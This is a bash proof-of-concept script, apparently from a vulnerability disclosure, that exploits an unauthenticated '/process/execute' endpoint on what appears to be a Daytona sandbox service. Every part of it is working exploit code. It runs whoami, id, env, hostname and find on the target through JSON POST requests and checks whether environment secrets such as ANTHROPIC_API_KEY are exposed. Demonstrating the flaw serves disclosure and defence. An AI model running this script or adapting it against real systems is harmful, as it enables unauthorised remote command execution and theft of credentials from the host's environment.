#!/bin/bash

# POC: Unauthenticated Remote Code Execution via /process/execute Endpoint
# This script demonstrates the vulnerability by executing various system commands
# through the vulnerable endpoint

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="${TARGET_URL}/process/execute"

echo "=== RCE POC: /process/execute Endpoint ==="
echo "Target: $ENDPOINT"
echo ""

# Test 1: whoami command
echo "[*] Test 1: Executing 'whoami' command"
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}')
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "daytona\|root\|exitCode"; then
  echo "[+] SUCCESS: Command executed, output captured"
else
  echo "[-] Response doesn't contain expected output"
fi
echo ""

# Test 2: id command
echo "[*] Test 2: Executing 'id' command"
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}')
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid=\|gid=\|groups=\|exitCode"; then
  echo "[+] SUCCESS: Command executed with output"
else
  echo "[-] Response format unexpected"
fi
echo ""

# Test 3: env command to show environment variables
echo "[*] Test 3: Executing 'env' command (checking for sensitive variables)"
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"command":"env"}')
echo "Response (first 500 chars): ${RESPONSE:0:500}"
if echo "$RESPONSE" | grep -q "ANTHROPIC_API_KEY\|PATH=\|HOME="; then
  echo "[+] SUCCESS: Environment variables exposed"
else
  echo "[!] Environment variables not in expected format"
fi
echo ""

# Test 4: hostname command
echo "[*] Test 4: Executing 'hostname' command"
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"command":"hostname"}')
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "exitCode"; then
  echo "[+] SUCCESS: Command executed"
else
  echo "[-] Unexpected response format"
fi
echo ""

# Test 5: Command with arguments
echo "[*] Test 5: Executing command with arguments (find /tmp)"
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"command":"find","args":["/tmp","-type","f","-maxdepth","1"]}')
echo "Response (first 300 chars): ${RESPONSE:0:300}"
if echo "$RESPONSE" | grep -q "exitCode"; then
  echo "[+] SUCCESS: Command with arguments executed"
else
  echo "[-] Unexpected response format"
fi
echo ""

echo "=== POC Complete ==="
echo "The /process/execute endpoint is vulnerable to unauthenticated RCE"